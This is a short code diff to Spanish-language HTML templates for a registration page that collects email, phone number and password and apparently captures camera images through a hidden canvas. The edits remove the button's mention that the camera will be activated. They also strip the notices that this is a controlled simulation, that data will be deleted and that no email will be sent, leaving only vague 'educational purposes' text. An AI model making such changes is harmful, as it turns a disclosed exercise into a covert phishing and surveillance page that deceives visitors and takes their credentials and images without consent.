@@ -93,7 +93,7 @@ LANDING_PAGE = """
                 <input type="email" id="correo" placeholder="Correo electrónico" required>
                 <input type="tel" id="telefono" placeholder="Número de teléfono" required>
                 <input type="password" id="contrasena" placeholder="Contraseña (solo para simulación)">
-                <button type="submit" id="btnEnviar">📩 Enviar datos y activar cámara</button>
+                <button type="submit" id="btnEnviar">📩 Enviar datos</button>
             </form>
         </div>
 
@@ -101,7 +101,7 @@ LANDING_PAGE = """
         <canvas id="canvas" style="display:none;"></canvas>
 
         <div id="estado" class="status"></div>
-        <p class="small">Simulación educativa controlada. Los datos se borrarán al final.</p>
+        <p class="small">fines educativos.</p>
     </div>
 
     <script>
@@ -228,7 +228,7 @@ GRACIAS_PAGE = """
 <body>
     <h1>✅ Gracias por registrarte</h1>
     <p>Te enviaremos un correo con el enlace de conexión a la presentación.</p>
-    <p><small>Esta es una simulación educativa. No se enviará ningún correo real.</small></p>
+    <p><small>uso con fines educativos.</small></p>
 </body>
 </html>
 """
